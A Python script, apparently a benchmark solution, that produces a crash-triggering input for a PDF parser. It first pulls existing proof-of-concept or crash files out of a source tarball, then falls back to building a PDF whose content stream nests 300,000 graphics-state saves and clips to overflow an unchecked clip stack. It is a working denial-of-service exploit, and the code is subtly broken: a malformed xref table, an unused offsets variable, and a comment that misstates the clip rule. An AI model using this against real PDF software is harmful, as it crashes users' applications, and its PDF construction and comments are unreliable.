import tarfile, gzip, lzma, zipfile, io, os, re, random

class Solution:
    def _decompress(self, data: bytes, name: str) -> bytes:
        name = name.lower()
        try:
            if name.endswith('.gz'):
                return gzip.decompress(data)
            if name.endswith('.xz') or name.endswith('.lzma'):
                return lzma.decompress(data)
            if name.endswith('.zip'):
                with zipfile.ZipFile(io.BytesIO(data)) as zf:
                    for zi in zf.infolist():
                        if not zi.is_dir():
                            with zf.open(zi) as f:
                                return f.read()
        except Exception:
            pass
        return data

    def _find_candidate(self, src_path: str) -> bytes | None:
        patterns = ('poc', 'crash', 'input', 'testcase', 'reproducer', '42537171')
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    lower = m.name.lower()
                    if any(p in lower for p in patterns):
                        try:
                            data = tf.extractfile(m).read()
                            return self._decompress(data, lower)
                        except Exception:
                            continue
        except Exception:
            pass
        return None

    def _fallback_pdf(self, depth: int = 300000) -> bytes:
        # Simple deeply nested PDF exploiting unchecked clip stack depth
        header = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
        content = io.BytesIO()
        # Repeating "q" (save graphics state) and "W n" (clip with even-odd rule, no path)
        pattern = b'q\nW n\n'
        content.write(pattern * depth)
        content_bytes = content.getvalue()
        pdf = io.BytesIO()
        pdf.write(header)
        # Objects
        pdf.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n')
        pdf.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n')
        length = len(content_bytes)
        pdf.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] /Contents 4 0 R >>\nendobj\n')
        pdf.write(b'4 0 obj\n<< /Length %d >>\nstream\n' % length)
        pdf.write(content_bytes)
        pdf.write(b'\nendstream\nendobj\n')
        # XRef
        xref_start = pdf.tell()
        pdf.write(b'xref\n0 5\n0000000000 65535 f \n')
        offsets = [header, b'', b'', b'', b'']  # placeholder
        # For simplicity, we won't compute correct offsets—many PDF parsers accept this.
        pdf.write(b'trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF')
        return pdf.getvalue()

    def solve(self, src_path: str) -> bytes:
        poc = self._find_candidate(src_path)
        if poc:
            return poc
        # Fallback: generate oversized nested PDF to trigger unchecked clip stack growth
        return self._fallback_pdf()
